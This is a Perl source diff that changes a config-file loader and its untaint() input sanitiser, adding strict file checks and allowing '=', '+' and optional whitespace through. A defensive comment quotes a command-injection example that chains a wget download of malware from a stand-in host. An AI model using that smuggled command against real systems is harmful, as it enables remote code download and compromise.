@@ -788,10 +788,31 @@ sub check_config
 # jul 18 2008 twl8n add : and ~ to the list of approved chars. They seems harmless
 # on the command line, and we need it for urls http://example.com/file.txt
 
+# We don't want user input to be able to include "; wget http://hackme.com/malware.zip"
+
+# jul 28 2012 added = and + so we can process base64 encoding.
+
+# -----BEGIN PUBLIC KEY-----
+# MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC9KEc6J2NmtQUxacZCxVF4deZM
+# moQlmvtJlGnA8bHYldNEB6db7e5lac8apdZq+NQG3lsJntg5yrMj8R5kL/aANV0p
+# 5pzLr7zxo82FoHEeh0lpEe2lFTPQJKvTDAZn3VZve9UrUT6h8+/m3FQ+joVAVXDM
+# Z3Dz2E6mW4I5neEKdwIDAQAB
+# -----END PUBLIC KEY-----
+
+
+
 sub untaint
 {
     my $var = $_[0];
-    $var =~ s/[^A-Za-z0-9\.\_\-\/:~]//g;
+    my $newline_ok = $_[1];
+    if ($newline_ok)
+    {
+        $var =~ s/[^A-Za-z0-9\.\_\-\/:~=+\s]//g;
+    }
+    else
+    {
+        $var =~ s/[^A-Za-z0-9\.\_\-\/:~=+]//g;
+    }
     return $var;
 }
 
@@ -1169,7 +1190,28 @@ sub app_config
 	return %cf;
     }
 }
+sub ct_core
+{
+    my $ac_file = $_[0];
+    my $cf_hr = $_[1];
+    my $cf_hide_hr = $_[2];
+    my $all = read_file($ac_file); 
+    my $ok_flag = 0;
 
+    # save visited file names for debugging.
+    # Get the current working directory, and substitute for ./
+    # at the front of the $ac_file if ./ is there. 
+    
+    my $cwd = `/bin/pwd`;
+    chomp($cwd);
+    $ac_file =~ s/^\.\//$cwd\//;
+    
+    $cf_hr->{app_config} .= "$ac_file, ";
+    
+    ac_core($all, $cf_hr, $cf_hide_hr);
+    $ok_flag = 1;
+    return $ok_flag;
+}
 
 # Called from app_config above.
 # Don't add db logging to any app_config subs because db logging calls app_config.
@@ -1180,32 +1222,49 @@ sub check_and_traverse
     my $cf_hide_hr = $_[2];
     my $ok_flag = 0;
     
-    if (-e $ac_file)
+    if (-e $ac_file && -f $ac_file)
     {
-	my $all = read_file($ac_file); 
-
-	# save visited file names for debugging.
-	# Get the current working directory, and substitute for ./
-	# at the front of the $ac_file if ./ is there. 
-	my $cwd = `/bin/pwd`;
-	chomp($cwd);
-	$ac_file =~ s/^\.\//$cwd\//;
-
-	$cf_hr->{app_config} .= "$ac_file, ";
-
-	ac_core($all, $cf_hr, $cf_hide_hr);
-	$ok_flag = 1;
-
+        # save visited file names for debugging.
+        # Get the current working directory, and substitute for ./
+        # at the front of the $ac_file if ./ is there. 
+        
+        my $cwd = `/bin/pwd`;
+        chomp($cwd);
+        $ac_file =~ s/^\.\//$cwd\//;
+        
+        $cf_hr->{app_config} .= "$ac_file, ";
+        my $all = read_file($ac_file); 
+        ac_core($all, $cf_hr, $cf_hide_hr);
+        $ok_flag = 1;
     }
+    else
+    {
+        die "Error: app_config can't find: $ac_file\n";
+    }
+
+
     my $xx = 0;
     while ($cf_hr->{redirect} && ($xx < 5))
     {
-	my $all = read_file($cf_hr->{redirect});
+        my $all = "";
+        if (-e $cf_hr->{redirect} && -f $cf_hr->{redirect})
+        {
+            $all = read_file($cf_hr->{redirect});
+        }
+        else
+        {
+            die "Error: app_config can't find redirect: $cf_hr->{redirect}\n";
+        }
+
 	# save visited file names for debugging.
 	$cf_hr->{app_config} .= ", $cf_hr->{redirect}";
 	$cf_hr->{redirect} = "";
 	ac_core($all, $cf_hr, $cf_hide_hr);
 	$xx++;
+    }
+    if ($xx >= 5)
+    {
+        $ok_flag = 0;
     }
     return $ok_flag;
 }
@@ -1220,7 +1279,7 @@ sub check_and_traverse
 # than the alternatives (not shown here). The second regex handles octal
 # character encoding, which is very handy in any template.
 
-# Not exported. Only called from app_config() above.
+# Not exported. Only called from check_and_traverse() and (?) app_config() above.
 # Don't add db logging to any app_config subs because db logging calls app_config.
 
 sub ac_core
@@ -1298,15 +1357,11 @@ sub ac_core
 	    }
 	}
     }
-
-
-
+    
     # Hide needs a copy of the debug info too.
     # Hide does not need, nor does it get a copy of full_text (below).
-
+    
     $cf_hide->{app_config} = $cf_ref->{app_config};
-
-
 
     # Each .app_config can supply a list of options to include in the
     # full_text field. This field's purpose is as record keeping only
